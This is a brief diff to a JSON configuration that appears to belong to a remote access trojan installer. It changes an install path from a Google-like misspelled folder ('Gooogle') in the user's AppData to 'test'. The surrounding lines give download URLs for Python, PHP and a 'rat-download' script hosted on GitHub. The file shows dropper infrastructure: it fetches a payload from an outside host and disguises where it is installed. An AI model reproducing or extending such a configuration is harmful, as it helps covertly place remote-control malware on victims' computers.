@@ -1,5 +1,5 @@
 {
-  "setup-path": "C:/Users/%USERNAME%/AppData/Roaming/Gooogle",
+  "setup-path": "C:/Users/%USERNAME%/AppData/Roaming/test",
   "python-download": "https://github.com/delypeter/http-delypeter.hu/raw/main/Python-Embedv02.zip",
   "php-download": "https://windows.php.net/downloads/releases/php-7.4.30-Win32-vc15-x86.zip",
   "rat-download": "https://raw.githubusercontent.com/delypeter/http-delypeter.hu/main/main.py",
